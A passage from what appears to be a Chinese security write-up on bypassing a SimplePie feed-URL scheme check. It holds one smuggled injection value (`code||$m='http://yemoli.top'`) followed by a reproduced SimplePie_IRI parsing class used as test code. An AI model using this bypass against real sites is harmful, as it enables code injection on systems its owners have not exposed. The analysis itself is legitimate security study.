class="string">'simplepie.simplepie'</span>);</span><br></pre></td></tr></table></figure><p><code>if</code>处最难<code>bypass</code>的是<code>$parsed_feed_url[&#39;scheme&#39;] !== &#39;&#39;</code>，这里考虑用分割符形如 <code>code||$m=&#39;http://yemoli.top&#39;</code></p><p>测试代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ERROR); </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>,<span class="string">"Off"</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SimplePie_IRI</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Scheme</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> private</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@var</span> string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> $scheme;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * User Information</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> private</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@var</span> string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> $userinfo;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Host</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> private</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@var</span> string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> $host;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Port</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> private</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@var</span> string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> $port;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Path</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> private</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@var</span> string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> $path;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Query</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> private</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@var</span> string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> $query;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Fragment</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> private</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@var</span> string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> $fragment;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Whether the object represents a valid IRI</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> private</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@var</span> array</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> $valid = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Return the entire IRI when you try and read the object as a string</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get_iri();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Create a new IRI object, from a specified string</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $iri</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> SimplePie_IRI</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SimplePie_IRI</span><span class="params">($iri)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$iri = (string) $iri;</span><br><span class="line"><span class="keyword">if</span> ($iri !== <span class="string">''</span>)</span><br><span class="line">&#123;</span><br><span class="line">$parsed = <span class="keyword">$this</span>-&gt;parse_iri($iri);</span><br><span class="line"><span class="keyword">$this</span>-&gt;set_scheme($parsed[<span class="string">'scheme'</span>]);</span><br><span class="line"><span class="keyword">$this</span>-&gt;set_authority($parsed[<span class="string">'authority'</span>]);</span><br><span class="line"><span class="keyword">$this</span>-&gt;set_path($parsed[<span class="string">'path'</span>]);</span><br><span class="line"><span class="keyword">$this</span>-&gt;set_query($parsed[<span class="string">'query'</span>]);</span><br><span class="line"><span class="keyword">$this</span>-&gt;set_fragment($parsed[<span class="string">'fragment'</span>]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Create a new IRI object by resolving a relative IRI</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@static</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> SimplePie_IRI $base Base IRI</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $relative Relative IRI</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> SimplePie_IRI</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">absolutize</span><span class="params">($base, $relative)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$relative = (string) $relative;</span><br><span class="line"><span class="keyword">if</span> ($relative !== <span class="string">''</span>)</span><br><span class="line">&#123;</span><br><span class="line">$relative = <span class="keyword">new</span> SimplePie_IRI($relative);</span><br><span class="line"><span class="keyword">if</span> ($relative-&gt;get_scheme() !== <span class="keyword">null</span>)</span><br><span class="line">&#123;</span><br><span class="line">$target = $relative;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> ($base-&gt;get_iri() !== <span class="keyword">null</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> ($relative-&gt;get_authority() !== <span class="keyword">null</span>)</span><br><span class="line">&#123;</span><br><span class="line">$target = $relative;</span><br><span class="line">$target-&gt;set_scheme($base-&gt;get_scheme());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">$target = <span class="keyword">new</span> SimplePie_IRI(<span class="string">''</span>);</span><br><span class="line">$target-&gt;set_scheme($base-&gt;get_scheme());</span><br><span class="line">$target-&gt;set_userinfo($base-&gt;get_userinfo());</span><br><span class="line">$target-&gt;set_host($base-&gt;get_host());</span><br><span class="line">$target-&gt;set_port($base-&gt;get_port());</span><br><span class="line"><span class="keyword">if</span> ($relative-&gt;get_path() !== <span class="keyword">null</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (strpos($relative-&gt;get_path(), <span class="string">'/'</span>) === <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">$target-&gt;set_path($relative-&gt;get_path());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (($base-&gt;get_userinfo() !== <span class="keyword">null</span> || $base-&gt;get_host() !== <span class="keyword">null</span> || $base-&gt;get_port() !== <span class="keyword">null</span>) &amp;&amp; $base-&gt;get_path() === <span class="keyword">null</span>)</span><br><span class="line">&#123;</span><br><span class="line">$target-&gt;set_path(<span class="string">'/'</span> . $relative-&gt;get_path());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (($last_segment = strrpos($base-&gt;get_path(), <span class="string">'/'</span>)) !== <span class="keyword">false</span>)</span><br><span class="line">&#123;</span><br><span class="line">$target-&gt;set_path(substr($base-&gt;get_path(), <span class="number">0</span>, $last_segment + <span class="number">1</span>) . $relative-&gt;get_path());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">$target-&gt;set_path($relative-&gt;get_path());</span><br><span class="line">&#125;</span><br><span class="line">$target-&gt;set_query($relative-&gt;get_query());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">$target-&gt;set_path($base-&gt;get_path());</span><br><span class="line"><span class="keyword">if</span> ($relative-&gt;get_query() !== <span class="keyword">null</span>)</span><br><span class="line">&#123;</span><br><span class="line">$target-&gt;set_query($relative-&gt;get_query());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> ($base-&gt;get_query() !== <span class="keyword">null</span>)</span><br><span class="line">&#123;</span><br><span class="line">$target-&gt;set_query($base-&gt;get_query());</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$target-&gt;set_fragment($relative-&gt;get_fragment());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// No base URL, just return the relative URL</span></span><br><span class="line">$target = $relative;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">$target = $base;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $target;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Parse an IRI into scheme/authority/path/query/fragment segments</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> private</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $iri</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">parse_iri</span><span class="params">($iri)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">preg_match(<span class="string">'/^(([^:\/?#]+):)?(\/\/([^\/?#]*))?([^?#]*)(\?([^#]*))?(#(.*))?$/'</span>, $iri, $match);</span><br><span class="line"><span class="keyword">for</span> ($i = count($match); $i &lt;= <span class="number">9</span>; $i++)</span><br><span class="line">&#123;</span><br><span class="line">$match[$i] = <span class="string">''</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">'scheme'</span> =&gt; $match[<span class="number">2</span>], <span class="string">'authority'</span> =&gt; $match[<span class="number">4</span>], <span class="string">'path'</span> =&gt; $match[<span class="number">5</span>], <span class="string">'query'</span> =&gt; $match[<span class="number">7</span>], <span class="string">'fragment'</span> =&gt; $match[<span class="number">9</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Remove dot segments from a path</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> private</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $input</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">remove_dot_segments</span><span class="params">($input)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$output = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">while</span> (strpos($input, <span class="string">'./'</span>) !== <span class="keyword">false</span> || strpos($input, <span class="string">'/.'</span>) !== <span class="keyword">false</span> || $input === <span class="string">'.'</span> || $input === <span class="string">'..'</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// A: If the input buffer begins with a prefix of "../" or "./", then remove that prefix from the input buffer; otherwise,</span></span><br><span class="line"><span class="keyword">if</span> (strpos($input, <span class="string">'../'</span>) === <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">$input = substr($input, <span class="number">3</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (strpos($input, <span class="string">'./'</span>) === <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">$input = substr($input, <span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// B: if the input buffer begins with a prefix 